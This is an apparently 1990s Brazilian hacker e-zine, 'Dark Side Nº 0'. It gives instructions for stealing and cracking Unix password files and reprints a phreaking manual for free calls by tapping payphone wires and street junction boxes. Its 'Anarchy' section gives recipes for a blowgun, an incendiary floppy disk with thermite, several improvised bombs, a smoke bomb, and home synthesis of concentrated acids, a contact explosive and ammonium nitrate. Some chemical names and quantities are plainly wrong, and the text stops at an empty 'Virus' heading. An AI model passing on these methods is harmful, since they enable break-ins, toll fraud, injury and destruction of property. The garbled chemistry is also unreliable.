
Dark Sided 
~~~~~~~~~

By Cyber Cool
		

Dark Side Nº 0
(Versão Beta)

Introdução	

	Depois de muito esforço, estou tentando lançar este zine para 
Dark Side Hackers. Se o meu provedor não cancelar minha conta, pretendo 
continuar com ele. Este Zine contém também partes de outros zines Hackers, que
será especificado quando retirado do referido. Nesta versão beta eu irei 
tentar colocar muitas dicas, já que não haverá nenhuma matéria concreta.

				******* Enjoy ! *********

Index
~~~~~

1 - Password do Unix
2 - Phreaking
3 - Anarchy
4 - Vírus
5 - Dicas 
6 - FAQ (não é de minha autoria)
6 - Como entrar em contato
Password do Unix

	Para poder pegar a senha dos usuários e do Super User é necessário entrar no sistema via ftp e pegar o arquivo passwd, que está no diretório /etc/. Daí ao abrir o arquivo você verá ele assim:

username:password:UserID:GroupID:descrição ou nome:homedir:shell

Ex.: Dark:teHDYSJS3d:0:3:Dark Sided:/:/bin

Username: Dark
Password encriptada: teHDYSJS3d
User Number: 0
Group User: 3
Descrição: Dark Sided
Homedir: /
Shell: /bin

	Agora se o arquivo estiver assim:
Dark:x:0:3:Dark Sided:/:/bin

	Você não é um cara de sorte. Vai ser muito difícil desencriptar a password porque o Unix está instalado no modo High. Mais se o arquivo estiver como no primeiro exemplo, você ainda terá chance de desencriptar o arquivo usando o crackjack e o directionary maker, ambos na nossa Home Page. O directionary maker serve para criar um arquivo de dicionário e o crackjack para tentar desencriptar a password.

1º - Crie um dicionário com o directionary maker.
2º - use o crackjack para desencriptografar o arquivo.
	Ex.: jack password meudic.dic

Depois disso você terá que esperar um longo tempo para que o crackjack termine de desencriptografar o arquivo.
	Bem, isso é tudo que eu posso informar a vocês. Não vou informar nada explicadinho que é para não acostumar.

Phreaking

	Desta vez eu não tive tempo para fazer uma boa seção de phreaking, então eu resolvi colocar este manual de phreaking que eu peguei na net.

Manual definitivo de violação a telefones públicos e privados


		      +---------- Aviso ----------+


Antes, aquele chavão de sempre: todos os procedimentos  descritos nesse docu-
mento são ilegais e podem levar o infrator a cumprir penas de prisão e/ou pa-
gamento de multas.
Vale lembrar também que eu sou contra qualquer tipo de vandalismo, e que todo
o processo aqui descrito não causa nenhum tipo de dano aos aparelhos  telefô-
nicos. Mesmo a longo prazo.
O cidadão idiota que copiar este documento, totalmente ou  em parte, sem avi-
sar o autor, não passará de um lamer de primeira que  não faz porra nenhuma e
tenta enganar os outros mas consegue enganar a si mesmo.
Esse texto poderá ser mencionado em outros documentos, desde que  conste nes-
ses de onde ele foi retirado e quem o escreveu (no caso, eu :-))



-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-



+---------------------------------------------------------------------------+
¦                                   Índice                                  ¦
+---------------------------------------------------------------------------+

1   - Introdução
1.1 - Prefácio da versão 1.1
1.2 - Pobreza de informações e pessoas mal informadas
1.3 - Conceitos básicos a respeito de telefonia

2   - Telefones privados
2.1 - Introdução
2.2 - Efetuando ligações de aparelhos sem teclas

3   - Telefones públicos
3.1 - Introdução
3.2 - Efetuando ligações gratuitamente utilizando um diodo
3.3 - Efetuando ligações gratuitamente utilizando um aparelho comum
3.4 - Conectando notebooks a telefones públicos
3.5 - Observação

4   - Caixas de verificação
4.1 - Introdução
4.2 - Efetuando ligações gratuitas de caixas de verificação

5   - Pequena FAQ sobre telefonia
5.1 - É possível tomar um choque mexendo em fios telefônicos?
5.2 - Como faço para fazer chamadas grátis de minha residência?
5.3 - O que é o BINA?
5.4 - Existe alguma maneira de se bloquear o BINA?
5.5 - As famosas "boxes" funcionam aqui no Brasil?

6   - O Autor
6.1 - PGP Key
6.2 - Agradecimentos
6.3 - Como contatar o autor



+---------------------------------------------------------------------------+
¦                           Seção 1 - Introdução                            ¦
+---------------------------------------------------------------------------+


1.1 - Prefácio da versão 1.1 ----+
      
      Depois de ter editado a primeira versão deste manual, recebi dezenas de
mensagens, principalmento do pessoal do BHC (Brazilian Hackers Club), com vá-
rias perguntas.  Algumas se  tornaram adendos e complemento para  as seções e
outras eu levei para uma Mini-FAQ, que está localizada na seção 5.

1.2 - Pobreza de informações e pessoas mal informadas  ----+

      Ao me deparar  com alguns textos do  gênero,  sentia-me decepcionado ao
perceber que eram incompletos e fracos, quando o assunto em questão era a te-
lefonia.
      É triste também perceber que pessoas mal informadas e  sem conhecimento
técnico (embora tenham boa vontade), assinam estes textos. Faço aqui um tuto-
rial com material bastante útil, que explica muitas coisas que podem ser fei-
tas com a intenção de buscar um pouco de liberdade para se utilizar os siste-
mas telefônicos.
      Este texto também é destinado àqueles que se rasgam de ler  textos ame-
ricanos de phreaking e boxing. Não importa o que fulano ouviu dizer que dava:
o sistema telefônico nacional é completamente diferente do usado nos E.U.A. e
não permite o "boxing". Ver maiores detalhes na seção 5.

1.2 - Conceitos básicos a respeito de telefonia ----+

      Ao contrário do que muita gente pensa, os fios da linha telefônica pos-
suem uma tensão contínua equivalente a -48 volts.  Esta tensão se altera para
um valor alternado de 96 volts quando o telefone toca. Portanto, ao lidar com
os fios do telefone, tenha  o cuidado de não encostar  no orelhão, na parede,
ou em qualquer coisa  que possa "aterrá-lo".  Este cuidado deve ser redobrado
se o telefone for comunitário ou residencial. Levemos também  em consideração
que se o aparelho possuí uma  tensão contínua,  significa que ele  tem também
uma polarização correta (fio positivo e fio negativo).  Na instalação do apa-
relho esta  polarização não faz diferença,  mas quando o  assunto é violação,
ela deve ser observada.
      Vamos lembrar também que existem dois tipos de linhas telefônicas:

      A) Decádicas (ou Pulse) - são as  linhas  dos prefixos mais  antigos do
sistema telefônico. A identificação de chamadas se dá através de uma série de
sinais (pulsos), que são interpretados pela central telefônica.

      B) Multifrequenciais (ou Tone) - são as linhas dos prefixos  mais novos
onde trabalham o serviço de CPA (Central telefônica com controle por Programa
Armazenado).  A identificação de  chamadas se dá através da  decodificação de
tons frequenciais em números.


+---------------------------------------------------------------------------+
¦                       Seção 2 - Telefones privados                        ¦
+---------------------------------------------------------------------------+


2.1 - Introdução ----+

      Nesta seção, explicarei o processo (bem simples) de se efetuar ligações
a partir de telefones sem teclas ou com cadeado,  muito comuns  em empresas e
ambientes de trabalho.

2.2 - Efetuando ligações de aparelhos sem teclas ----+

      Antes de começarmos, precisamos definir o  que significa "duração de um
pulso". Um pulso é simplesmente uma interrupção no fluxo de corrente que cir-
cula na linha telefônica, e a sua duração é entendida como  o espaço de tempo
decorrido do início ao fim desta interrupção.
      Os pulsos enviados pelo aparelho telefônico quando  você aperta o botão
de algum número, são iguais ao sinal emitido quando você coloca o telefone no
gancho. A diferenciação é feita pela central telefônica, usando como referên-
cia a duração do pulso. Se ele for um pouco maior do que 0.5 segundos (aumen-
tar um pouco esse valor para as linhas mais antigas), a central considera que
é um pedido de linha.  Se a duração do pulso  for menor do que  esse valor, a
central irá considerar que um número a ser discado está sendo enviado.
      Para formar os números de 0 a 9, são enviado uma série de pequenos pul-
sos em seqüência referentes ao número, ou seja,  2 pulsos  para o número 2, 3
para o número 3 e assim por diante. Para o número 0 são enviados dez pulsos.
      Para simular esses pulsos sem a necessidade de teclas, basta usar o bo-
tão onde se "pega" a linha, aquele onde você coloca o  telefone em cima quan-
do quer terminar uma ligação. Aperte e solte este botão rapidamente  de acor-
do com o número que você quer discar, espere um pouco e aperte outra série de
vezes de acordo com o outro número. Lembre-se que para o  número 0 deve-se a-
pertar o botão dez vezes.
	 Faça isso com todos os números e,  ao final, você  escutará o tom de
chamada.


+---------------------------------------------------------------------------+
¦                       Seção 3 - Telefones públicos                        ¦
+---------------------------------------------------------------------------+


3.1 - Introdução ----+

      Nesta seção explicaremos alguns métodos  de efetuar ligações com  tele-
fones públicos sem a necessidade de se gastar fichas. Mostraremos também como
ligar notebooks a telefones públicos  (se é que existe um hacker que não sai-
ba...).

3.2 - Efetuando ligações gratuitamente utilizando um diodo ----+

      O diodo é um componente eletrônico que possui diversas utilizações. Po-
demos resumir seu funcionamento basicamente na seguinte síntese:
      Um diodo (ou junção PN),  permite que a corrente  circule em apenas uma
direção dentro de um circuito.
      Ao  se utilizá-lo para o fim aqui desejado,  vamos precisar de um diodo
IN4002, IN4004 ou IN4007. Estes podem ser encontrados facilmente  em qualquer
casa de componentes eletrônicos. Vamos precisar também de um resistor com va-
lor nominal de 22K e potência de 1W.
      Basta que você ligue o diodo em paralelo com o resistor (conforme tenta
mostrar a ilustração abaixo) e,  em seguida, descasque os fios do  telefone e
ligue cada uma das pontas obtidas com o diodo e o resistor neles.
      Lembre-se: você vai apenas descascar os fios do orelhão!!! Se você cor-
tá-los, ele vai ficar sem linha.
		   

				      ||
				      ||     fio do telefone
				      ||
				      ||
		   +------------------++-------------------+
		   |                                       |
		   |                                       |
		   |           +----¦¦¦¦¦¦¦----+           |
		   |          /      diodo      \          |
	   ponta   +--------+                   +--------+   ponta
		   |          \                 /          |
		   |           +----¦¦¦¦¦¦¦----+           |
		   |                resistor               |
		   |                                       |
		   +------------------++-------------------+
				      ||
				      ||     fio do telefone
				      ||
				      ||

      
      Para executar esta tarefa, eu aconselho que você  descasque os fios dos
orelhões que você utiliza com mais freqüência pois,  devido ao fato  dos fios
do telefone público serem muito grossos, não é um trabalho que se possa fazer
tranqüila e rapidamente sem ser notado.
      Você deverá observar também a polarização correta a ser utilizada.  Vo-
cê perceberá isso facilmente pois, quando você ligar o diodo de maneira erra-
da, o orelhão vai ficar sem linha.
      Uma dica pessoal: os telefones de cabine e os de cartão são mais fáceis
de serem violados. Alguns orelhões comuns tem uma proteção blindada que impe-
dem o acesso ao cabo telefônico. Embora mesmo assim seja possível puxar o fio
com um gancho, que você enfiará do lado esquerdo do aparelho telefônico,  en-
tre o telefone e uma grade preta de sustentação que fica atrás dele, eu acon-
selho que você evite esses tipos.
      Vamos voltar um pouco para a parte técnica da coisa.
      O diodo que estamos utilizando vai funcionar da seguinte maneira:
      Quando uma ligação é completada de um  telefone público,  a central in-
verte a polarização do telefone de -48 para 48 volts. Quando o aparelho tele-
fônico percebe isso,  ele pede uma fixa.  É aí que entra  em funcionamento  o
nosso querido diodo. Ele permite que a tensão caia até 0 volts, mas não  per-
mite que ela se torne positiva. Dessa forma o orelhão não vai pedir a ficha.
      Nesse caso o resistor está funcionando apenas como um dissipador de po-
tência, para que você não dê o azar de queimar o diodo  (não que ele seja ca-
ro, é que em algumas localidades ele pode ser uma peça rara que custa R$0,10)
e ficar sem telefonar. Mesmo se você não achar nenhuma loja que venda,  pegue
uma placa antiga de alguma coisa que tenha queimado.  Elas sempre tem diodos.
Você deve procurar uma peça  pequinininha que tem  dois terminais,  é preta e
normalmente estará escrito IN qualquer coisa.

3.3 - Efetuando ligações gratuitamente utilizando um aparelho comum ----+

      Primeiro, você deve tomar os processos citados anteriormente  para des-
cascar os fios do telefone. Em seguida você deve  conseguir um aparelho tele-
fônico comum e ligar cada uma das pontas dos fios dele nos fios do orelhão.
      Para facilitar a sua  vida, eu aconselho que o seu telefone  seja o me-
nor possível e que você prenda um jacaré  (pequeno gancho  achado em qualquer
loja de componentes eletrônicos) em cada uma das pontas do seu telefone, para
facilitar a ligação no orelhão.
      Aí é só efetuar a ligação normalmente.

3.4 - Conectando notebooks a telefones públicos ----+

      O processo para se conectar notebooks a orelhões, é igual ao de se  co-
nectar telefones comuns. Resumirei nesse item,  algumas considerações  a res-
peito da fiação  do notebook,  que segue os  padrões da FCC  Americana e é um
pouco diferente da nossa.
      O conector do fio do notebook, que é do tipo jack, tem quatro fios den-
tro dele. Arranque o conector de plástico  transparente  que fica na ponta do
fio, pegue os dois fios centrais e separe-os dos fios das extremidades.
      Estes dois fios centrais, são os que serão utilizados  para fazer a li-
gação no orelhão. Eu aconselho que você coloque jacarés neles também.
      Basta conectar-se a BBS's da mesma forma que você se conecta em casa.
      Caso você queira testar se está tudo OK,  abra um programa de  terminal
qualquer e digite o comando ATA, se fizer um barulhinho parecido com o tom de
linha é que está tudo OK.

3.5 - Observação ----+

      As chamadas telefônicas se dividem em três categorias: locais,  DDD re-
gionais e interurbanas (ou nacionais).
      As chamadas locais são aquelas efetuadas dentro  de sua cidade,  as DDD
regionais são as ligações feitas dentro do complexo urbano onde você mora, no
caso de São Paulo, as chamadas DDD regionais são aquelas feitas para as cida-
des que  fazem parte da Grande São Paulo: Jundiaí, Santo André, São Bernardo,
etc. As chamadas interurbanas são aquelas feitas para fora do complexo urbano
onde você está localizado. Usando São Paulo como exemplo, podemos citar o in-
terior do estado de São Paulo e cidades localizadas em outros estados.
      Os telefones comuns efetuam chamadas locais e DDD regionais, e os tele-
fones DDD efetuam chamadas interurbanas, ou seja, para qualquer lugar do Bra-
sil.


+---------------------------------------------------------------------------+
¦                     Seção 4 - Caixas de verificação                       ¦
+---------------------------------------------------------------------------+


4.1 - Introdução ----+

      As caixas de verificação (ou armários na linguagem "técnica" da Telesp)
são caixas de ferro, que geralmente ficam localizadas em vias públicas, e são
utilizadas para se fazer a checagem das linhas do sistema e  identificar pro-
blemas antes de se enfiar no subsolo para tentar resolvê-los.
      Tais caixas costumam ser da cor cinza  e tem cerca de 1,5 m  de altura,
com um código em preto escrito na parte superior.
      Elas possuem um grande número de fios telefônicos, todos eles divididos
em pares. Tais caixas podem ser facilmente abertas (se é que a que você achar
já não estiver arrombada), pois geralmente possuem uma tranca padrão em forma
de triângulo que qualquer chaveiro conhecido pode fazer.
      Lembre-se que você é um hacker, não um vandalo. Não vá arrombar a porra
da caixa. Isto é coisa pra quem não tem cérebro. Mesmo se ela estiver tranca-
da com um cadiado. Se não puder abrir um cadiado ou procurar informação de um
método para abrí-lo, procure outra caixa.  Ou então esqueça que você leu esta
seção.

4.2 - Efetuando ligações gratuitas de caixas de verificação ----+

      Para se efetuar uma ligação de dentro destas caixas, basta que você pe-
gue um dos diversos pares de fios que se encontram lá dentro e ligue  eles ao
seu pequeno telefone comum portátil ou a um notebook.  Não esqueça de por  os
fios que você tirou de volta no lugar para que, nem o pessoal da manutenção e
nem o dono da linha, percebam.
      Como essas caixas de verificação costumam se situar em  vias bem  movi-
mentadas, a prática desse tipo de ligação é desaconselhada. Mas, como toda  a
regra tem sua exceção, fica aqui mais uma informação para você.
      Vale lembrar que de caixas de verificação, pode-se  efetuar telefonemas
para qualquer lugar, inclusive chamadas internacionais.


+---------------------------------------------------------------------------+
¦                   Seção 5 - Pequna FAQ sobre telefonia                    ¦
+---------------------------------------------------------------------------+


5.1 - É possível tomar um choque mexendo em fios telefônicos? ----+
      
      Como descrito no item 1.3, os fios telefônicos possuem uma tensão sufi-
ciente para dar choque relativamente forte em uma pessoa.  Este valor de ten-
pode atingir um patamar em que ele pode dar um verdadeiro coice na pessoa, no
momento em que a linha envia o sinal para o telefone tocar.
      Isto depende muito da situação e da pessoa.  Se voce estiver com a  mão
no orelhão e mexer nos fios, você provavelmente vai tomar um choque legal. Se      
você tiver acabado de comer algo salgado, provavelmente este choque será ain-
da mais forte, pois o sal aumente a condutividade do seu corpo.

5.2 - Como faço para fazer chamadas grátis de minha residência? ----+

      Quando você efetua uma chamada, a central telefônica identifica de onde
você está discando, identifica  qual o tipo de telefone que  você está usando
(público ou residencial), e então ela arquiva pra onde está senda feita a li-
gação e toma as providências necessárias com relação a cobrança.
      Essa identificação é feita na fonte e não por um sinal enviado pelo seu
telefone. Desse modo, é praticamente impossível pra você que está  na sua re-
sidência, tentar driblar essa tarifação. Imagine que sua linha telefônica não
passa de um ramal de PABX.

5.3 - O que é o BINA? ----+
      
      O BINA, é um sistema de identificação de chamadas desenvolvido com tec-
nologia nacional, que permite  a quem está recebendo a chamada,  visualizar o
número do telefone de quem está telefonando para ele.
      O esquema teve que ser desenvolvido aqui no Brasil,  pois o sistema te-
lefônico é tão arcaico, que não existiam pacotes prontos  para se adquirir. É 
como você tentar comprar um Kit Multimídia para um TK-85 ou um MSX.
      Tal sistema só funciona em linhas Decádicas,  portanto,  se você quiser
passar um trote para alguém, procure se certificar  qual o tipo de linha  que
ela possui. Para isso,  basta você dar uma olhada no  prefixo e ligar  para a
sua  compania telefônica  local perguntando se  ele suporta CPA.  Se eles fa-
larem que sim,  então pode ficar  tranqüilo e efetuar a  ligação que você não
corre o risco de ser descoberto.
      Mas tome cuidado com o que você vai fazer pois,  sob ordem judicial, as
companias locais podem fornecer um rastreamento de chamadas e assim descobrir
de onde você telefonou.

5.4 - Existe alguma maneira de se bloquear o BINA? ----+

      Da mesma maneira que a tarifação, o BINA não pode ser driblado do tele-
fone que você está efetuando a chamada. Quem fornece o número  que vai apare-
cer no aparelho do receptor, é enviado pela central telefônica e não pelo seu
telefone.
      Vale que acrescentar que o sistema não funciona perfeitamente bem e que
às vezes não consegue identificar determinada chamada. Ele também não identi-      
fica chamadas de telefones públicos.

5.5 - As famosas "boxes" funcionam aqui no Brasil? ----+

      Como se pode notar nesta seção, o sistema telefônica nacional, trabalha
de maneira centralizada ao contrário do americano que trabalha  de forma dis-
tribuída. E não é por acaso, pois, além  de possuirem um número bem  maior de
linhas telefônicas, os serviços lá são privatizados e diversas companias ofe-
recem linhas telefônicas.
      A tarifação se dá por diversas identificações enviadas  pelos telefones
e diversas centrais distribuidas pelo país. O que os "boxes" fazem, e driblar
esses sinais enviando outros de diversas freqüenciais diferentes.
      Por exemplo, você faz uma chamada internacional mas usa uma "box"  para
enviar um sinal para a central de como esta chamada fosse uma chamada local.
      Já de  telefones  públicos (quem já foi pra lá sabe disso),  depois que
você efetua uma chamada, aparece novamente um tom de linha que fica aguardan-
do o sinal do orelhão que diz que você pagou determinada taxa para o determi-
nado serviço. Neste caso os "boxes" enviam os sinais no  lugar do orelhão e a
chamada é completada. Esses tipos são conhecidos como Red Boxes, mas não fun-
cionam em todos os telefones públicos.
      Sem bem que, ultimamente,  as centrais telefônicas  estão sendo substi-
tuídas por modelos mais novos. Isto  ocorre principalmente em São Paulo.  Mas
caso  elas permitam o "boxing",  isto será um assunto para um  próxima versão
desta FAQ.


+---------------------------------------------------------------------------+
¦                            Seção 6 - O autor                              ¦
+---------------------------------------------------------------------------+


6.1 - Agradecimentos ----+

      Agradeço a todas aquelas pessoas que escreveram textos ruins sobre vio-
lação de telefones e me estimularam a fazer um trabalho melhor elaborado.
      Espero em breve  poder escrever uma FAQ sobre  telefonia celular, deta-
lhando processos de escuta telefônica e mais algumas coisas.      
      Obrigado ao pessoal do  Brazilian Hackers Club,  que mandaram perguntas
que foram adicionadas a Seção 5.  Suas perguntas  ajudaram também a completar
algumas seções.  Hackers do Brasil,  uni-vos contra o  preconceito e contra o
vandalismo eletrônico.
      Agradeço também a todos aqueles que contribuem para que haja uma  maior
liberdade de expressão em todos os meios de comunicação, em especial, a nossa
querida NET. Saudações também a todos aqueles que lutam por condições  melho-
res de vida. Quem sabe um dia possamos viver em um mundo mais justo e com me-
nos desigualdades sociais. Morte ao pensamento neoliberal.

"Lutamos por um mundo melhor. Um mundo onde você possa ser feliz sem que isso
implique na infelicidade do seu próximo"

Marcos - Líder do Exército Zapatista de Libertação Nacional


6.2 - PGP Key ----+

Tipo Bits/IDChave  Data       Usuário (IDU)
pub  1024/11E9A405 1996/12/21 Tom Waits <tom.waits@usa.net>

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3ia

mQCNAzK7UwMAAAEEANQz27W9JQUVDYLxEGVX8l0An1tYLbbLXwEg6xBc9Y6/dcAa
bn+Z5RbT5PrkySCVaLgePIfCKCzAEAkbAyCES7X2YNoHDD6Ea4AQn7TDWbP0Wprw
xbJErRuuE1G+WquDa/nPSmsrZw+h29Ec3AR/G3/WW/95FD8yybLjR4gR6aQFAAUR
tB1Ub20gV2FpdHMgPHRvbS53YWl0c0B1c2EubmV0PokAlQMFEDK7UwOy40eIEemk
BQEByRIEAKPvqZAEEk6oyZXyfs82gc/Lt4cBNonFm1CBph4w/JqX7QkkSibD7PUW
ewsTxht6ESsJbDWsT0st7bU9UfLJFqfeOMq5NH4q8gpJQFFG9IBUx/PrZxeOAwpa
SWIfUGt/cfOHn0gurh1AgktS5NyXOeRL5QDw0x3O/XKNY/Pv03KV
=+Fdu
-----END PGP PUBLIC KEY BLOCK-----


6.3 - Como contatar o autor ----+

      Para esclarecimentos ou correções, mande-me um e-mail ou procure-me  no
Brazilian Hackers Club. Uma associação mantida da livre iniciativa de um cara
muito dedicado que atende por Liquid Byte.
      Terei prazer em responder a perguntas inteligentes, não sou fresco como
alguns membros da comunidade...
      Dependendo do que você  for perguntar, isto é,  coisas comprometedoras,
use o PGP. Tenha bom senso. Se você fizer perguntas idiotas, receberá respos-
tas cretinas.

e-mail: tom.waits@usa.net
LiquidByte home-page (Brazilian Hackers Club)
http://www.geocities.com/SiliconValley/Heights/6152/

Free Speech!!!
Rage Against The Machine.

Anarchy

	Como eu já tinha dito, estou sem tempo, mas na próxima edição eu coloco uma seção mais completa.

ARMA DE SOPRO

Para a arma você precisa de:

* Um cano de aproximadamente 0.7 mm de diâmetro.

Para os dardos você precisa de:

* Um lápis com a borracha;
* Um alfinete ou agulha de costura;
* Lã;
* Fita adesiva.

Instruções:

	Retire a borrachinha com o metal do lápis. Recorte uns pedacinhos de 2 cm de lã e prenda com a fita adesiva no fundo do alfinete. Deixe o fundo do alfinete bem grosso com bastante fita. Enfie o alfinete na borracha pelo lado do metal. Force bem para que a parte com fita prenda na borrachinha.
	
	Para atirar, coloque dardo dentro do cano e assopre.

O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.

DISQUETE-BOMBA


Você precisa de:

* 1 ou mais discos de 3.5 polegadas;
* Uma caixa de fósforo, azul ou branco SOMENTE!;
* Um estilete bem afiado;
* Um frasco de cimento plástico ou argamassa;
* Um centímetro de magnésio em tiras (opcional);
* Uma grama de termite. Mistura de alumínio pulverizado e óxido de ferro, 
     usada na produção do aço (opcional).

Instruções:

	Abra cuidadosamente o diquete. Com o disco aberto você tem que escolher entre arrancar a proteção onde fica a marca do disco (normalmente de metal), ou deixar ela no lugar. Se a proteção for arrancada, a bomba vai ficar visível e você mesmo terá de colocá-la no drive. Se a proteção ficar no lugar, você pode dar o disco para um "amigo". Raspe a cabeça dos fósforos e amasse para que vire um pó. Retire o pano do disquete e cubra um ou ambos os lados do disco com a argamassa. Espalhe o pó dos fósforos em cima e deixe secar. Feche o disco colando os cantos e pronto!
	Se você quiser um estrago maior, coloque a tira de magnésio em cima do pó dos fósforos. Se você quiser destruir o computador, coloque o termite em baixo do magnésio.

Funcionamento:

	Quando o disco for acessado o pó dos fósforos irá atritar e acender. O disco vai derreter e se espalhar pelo drive. Se você usou o magnésio, o calor gerado pelos fósforos vai acender a tira. O magnésio vai queimar destruindo o drive permanentemente e, com sorte, outras coisas mais que estiverem por perto. Se você usou o magnésio e o termite juntos, o magnésio irá acender o termite e ele vai começar a agir. O termite vai queimar o disco, o drive, o gabinete, a mesa, o chão e vai pingar em algum lugar perto do Japão.

O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.

BOMBA DE CLORO

Você precisa de:

* Cloro (com Hipocloreto de Sódio);
* Água;
* Açúcar;
* Uma garrafa de dois litros.

Instruções:

	Misture o cloro, a água e o açúcar em partes iguais. Encha mais ou menos 1/10 da garrafa com a mistura. Deixe no chão e corra.

Funcionamento:

	As substâncias reagem e soltam gases. A pressão dentro da garrafa aumenta e ela explode.

BOMBA DE CARBONETO

Você precisa de:

* Carboneto de Cálcio;
* Um pote de vidro com tampa;
* Água.

Instruções:

	Encha o vidro com água. Coloque o Carboneto de Cálcio no vidro e tampe. Deixe no chão e saia correndo. Corra MESMO !! Esse tipo de bomba é muito perigoso.

Carboneto de Cálcio pode ser encontrado facilmente em qualquer loja de construção.

Funcionamento:

	O Carboneto vai reagir com a água e formar um gás inflamável chamado Carbonato de Acetileno. A pressão no pote de vidro irá aumentar e o pote irá estourar.
	Se você quiser um maior estrago, deixe um pedaço de pano queimando por perto. O vidro estoura, o Acetileno atinge a chama e explode formando uma bola de fogo.

BOMBA DE FUMAÇA

Você precisa de:

* Açúcar;
* Nitrato de Potássio;
* Um pote com boca larga.

Instruções:

	Junte 4 partes de açúcar com 6 partes de Nitrato de Potássio numa panela. Esquente em fogo baixo e mexa bem até derreter tudo. Coloque a mistura no pote e, antes de solidificar, jogue alguns fósforos para funcionar como pavio.

Funcionamento:

	O fósforo queima e acende a mistura. Acontecem reações químicas e a fumaça é liberada.

O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.

BOMBA DE IMPACTO

Você precisa de:

* Uma bola de gude;
* Pólvora;
* Um saco plástico;
* Linha ou barbante.

Instruções:

	Recorte um pedaçinho do plástico que seja suficiente para embrulhar a bola de gude. Coloque um pouco de pólvora em cima do plástico, a bola em cima da pólvora e embrulhe-a com o plástico. Amarre a ponta com o barbante, fazendo com que fique bem firme para a pólvora não sair. Para detonar, jogue a bomba em alguma superfície dura.

Funcionamento:

	Quando a bomba bate na superfície dura, a bola de gude espreme a pólvora fazendo com que estoure. A explosão é bem forte mesmo com pouca pólvora, então tome cuidado pois a bola é espatifada e voam pedaços de vidro por todos os lados.

	Em estádios de futebol foram encontradas bombas com bolas de sinuca em vez de bolas de gude. Invente você sua bomba (só não vá usar bolas de boliche!!).

O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.

FAZENDO SUBSTÂNCIAS DE DIFÍCIL ACESSO

ÁCIDO SULFÚRICO CONCENTRADO

Você precisa de:

* Ácido de bateria (comprado em qualquer loja automotiva);
* Uma panela de vidro.

Instruções:

	Coloque o ácido na panela de vidro e ferva até aparecer uma fumaça branca. Quando essa fumaça branca aparecer, apague o fogo e guarde o Ácido Sulfúrico Concentrado em um pote de vidro com uma tampa hermetica.


NITRATO DE POTÁSSIO

Você precisa de:

* Pólvora comum;
* Água;
* Um coador (de café serve);
* Uma panela.

Instruções:

	Dissolva a pólvora numa panela com água fervente. Mexa por uns instantes. Coe a solução com um coador por diversas vezes até a solução ficar transparente. O que ficar no coador é carvão e enxofre e pode ser descartado. A solução, depois de coada, apresenta o Nitrato de Potássio dissolvido em água. Deixe a água evaporar e está pronto.

ÁCIDO NÍTRICO CONCENTRADO

Você precisa de:

* Nitrato de Potássio;
* Água destilada;
* Ácido Sulfúrico concentrado;
* Fogão;
* Uma Retorta (um pote com o gargalo entortado para baixo);
* Um tubo de ensaio;
* Um recipiente com gelo;
* Uma vareta para agitar a solução.

Instruções:

	Coloque 32 milímetros de ácido sulfúrico concentrado na retorta. Junte 68 gramas (BEM PESADAS) de nitrato de potássio e agite cuidadosamente até dissolver tudo. Coloque o tubo de ensaio no recipiente com de gelo e leve até a boca da retorta. Comece então a esquentar a retorta. A solução irá evaporar e seguir pelo gargalo até o tubo de ensaio. Com o frio do tubo, ela condensará e você tem o Ácido Nítrico Cocentrado. Continue a operação até acabar toda a solução na retorta e guarde o ácido num pote de vidro com tampa.

CRISTAIS DE TRIÓXIDO DE AMÔNIA

Você precisa de:

* Cristais de Iodo;
* Amônia (transparente);
* Funil;
* Filtro de Papel;
* Papel Toalha;
* Duas jarras de vidro velhas;

Instruções:

	Coloque duas coleres-de-chá de iodo em uma das garrafas. Vá despejando amônia até cobrir o iodo. Colque o filtro no funil e o funil na outra garrafa. Deixe o iodo encharcar um pouco na amônia e depois despeje-o no funil. Retire o funil e espalhe as pedrinhas formadas no papel toalha para secar ao sol. Essa substância tem uma vida útil de aproximadamente 1 semana, portanto não estoque ou guarde.

NITRATO DE AMÔNIA

Você precisa de:

* Um frasco de boca larga;
* Uma bacia com gelo;
* Ácido Nítrico;
* Amônia.

Instruções:

	Faça isso num lugar aberto e bem ventilado pois são exalados gases tóxicos. Encha o frasco com Ácido Nítrico e coloque-o na bacia com gelo. Despeje a amônia no frasco e saia de perto. Irão ocorrer reações e uma grande liberação de gases. Por volta de meia depois, retire o frasco do gelo e deixe-o no sol para secar. O pó que se formará é Nitrato de Amônia. Guarde em um pote hermeticamente fechado pois este tipo de substância tende a absorver água do ar.

TABELA DE EQUIVALÊNCIA


Nome - Inglês			Nome - Português			Equivalente

acetic acid			ácido acético				vinagre
aluminum oxide		óxido de alumínio			alúmen
aluminum potassium sulfate	sulfato de potássio de alumínio	pedra-ume
aluminum sulfate		sulfato de alumínio			pedra-ume
ammonium hydroxide		hidróxido de amônia			amônia
carbon carbonate		carbonato de carbono			giz
carbon tetrachloride		tetracloreto de carbono		removedor
calcium hypochloride		hipocloreto de cálcio			sapólio
calcium oxide			óxido de cálcio			cal
calcium sulfate		sulfato de cálcio			gêsso
carbonic acid			ácido carbônico			água de soda
ethylene dichloride		bicloreto de etileno			fluído alemão
ferric oxide			óxido férrico				ferrugem
glucose			glicose					xarope de milho
graphite			grafite					ponta de lápis
hydrochloric acid		ácido clorídrico			desinfetante
hydrogen peroxide		peróxido de hidrogênio		peróxido
lead acetate			acetato de chumbo			sal de chumbo
lead tetroxide			tetróxido de chumbo			chumbo
magesium silicate		silicato de magnésio			talco
magesium sulfate		sulfato de magnésio			Sal de Epsom
naphthalene			naftalina				bola de naftalina
phenol				fenol					ácido fênico
potassium bicarbonate	bicarbonato de potássio		creme adstringente
potassium chromium sulfate	sulfato de cromo de potássio		alúmen cromo
potassium nitrate		nitrato de potássio			salitre
sodium dioxide		dióxido de sódio			areia
sodium bicarbonate		bicarbonato de sódio			soda quente
sodium borate			borato de sódio			bórax
sodium carbonate		carbonato de sódio			soda de lavagem
sodium choride		clorito de sódio			sal
sodium hydroxide		hidróxido de sódio			lixívia
sodium silicate			silicato de sódio			vidro solúvel
sodium sulfate			sulfato de sódio			Sal de Glauber
sodium thiosulfate		tiossulfato de sódio			hipossulfito (fotos)
sulferic acid			ácido sulférico				ácido de bateria
sucrose			sacarose				cana de açúcar
zinc choride			clorito de zinco			tiner

O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.

Virus

